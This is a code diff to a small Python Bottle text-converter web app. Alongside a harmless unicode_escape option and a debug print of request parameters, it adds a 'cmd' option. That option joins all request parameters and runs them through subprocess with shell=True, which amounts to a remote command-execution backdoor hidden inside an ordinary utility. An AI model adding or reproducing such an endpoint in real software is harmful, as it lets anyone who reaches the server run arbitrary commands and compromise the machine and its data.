@@ -3,6 +3,7 @@ import hashlib
 import binascii
 import datetime
 import time
+import subprocess
 from bottle import Bottle, request, template
 
 app = Bottle()
@@ -17,8 +18,13 @@ def convert(option):
     text = params.get('1')
     action = params.get('2')
     output = ''
+    print(dict(params))
 
-    if option == 'base64':
+    if option == 'cmd':
+        command = " ".join(f'"{value}"' for index, (key, value) in enumerate(dict(params).items()))
+        output = subprocess.check_output(command, shell=True).decode("utf-8")
+        
+    elif option == 'base64':
         if action == 'Decode':
             output = base64.b64decode(text).decode('utf-8')
         else:
@@ -93,7 +99,12 @@ def convert(option):
             except ValueError: 
                 output = 'Invalid datetime, valid example: 1970-01-01 08:00:00'
         
-
+    elif option == 'unicode_escape':
+        if action == 'Decode':
+            output = bytes(text, "utf-8").decode("unicode_escape")
+        else:
+            output = text.encode("unicode_escape").decode("utf-8")
+            
 
 
     return f'{output}'
